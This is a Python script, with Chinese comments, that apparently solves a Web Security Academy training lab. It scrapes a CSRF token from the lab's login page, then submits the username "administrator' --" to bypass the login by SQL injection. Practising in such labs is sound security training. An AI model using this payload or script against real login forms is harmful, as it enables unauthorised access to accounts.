# 這一版是自己打的版本
# 實測過也可通關
import requests
from typing import Optional, Any

BASE_URL = "https://0ae3000f03865088808399f3008e0077.web-security-academy.net/login";
session= requests.session();

def send_get_request(url: str, params: Optional[dict[str, Any]]=None, timeout: int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, params=params, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None;

def send_post_request(url:str, data: dict[str,any], timeout:int=10) ->Optional[requests.Response]:
    try:
        # 因為用Content-Type application/x-www-form-urlencoded傳輸所以data送post
        # 如果用json會失敗
        return session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

"""
🔹 你的程式情境
你的 get_csrf_token() 其實是：
呼叫 send_get_request(BASE_URL) → 有網路請求
用 BeautifulSoup parse HTML
從 <input> 抓 token
👉 這不是「單純取值」，而是「去伺服器抓資料」。
✅ 建議命名
用 fetch_csrf_token() 會更清楚，因為它真的會「fetch 遠端資源」。
如果將來你想要「有快取版本」的話，也可以設計成：
"""
def fetch_csrf_token() -> Optional[str]:
    try:
        response = send_get_request(BASE_URL) 
        if response and response.status_code ==200:
            print("url 200")
            #print(response.text)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_input = soup.find("input",{"name":"csrf"})
            if csrf_input and csrf_input.get("value"):
                return csrf_input.get("value")
        else:
            print("csrf token get failed")
            return None;
    except requests.RequestException as e:
        print(f"error:{e}")
        return None;

def main():
    
    # 先取得csrf
    csrf_token = fetch_csrf_token()
    if csrf_token:
        print(f"csrf:{csrf_token}")
    else:
        return

    # 制定payload
    payload = {
        "csrf": csrf_token,
        "username":"administrator' --",
        "password":"aa"
    }

    # sqli
    response = send_post_request(BASE_URL, payload)
    if response and response.status_code == 200:
        print(response.text)
    else:
        print(f"sqli failed, status_code:{response.status_code}")


if __name__ == "__main__":
    main();

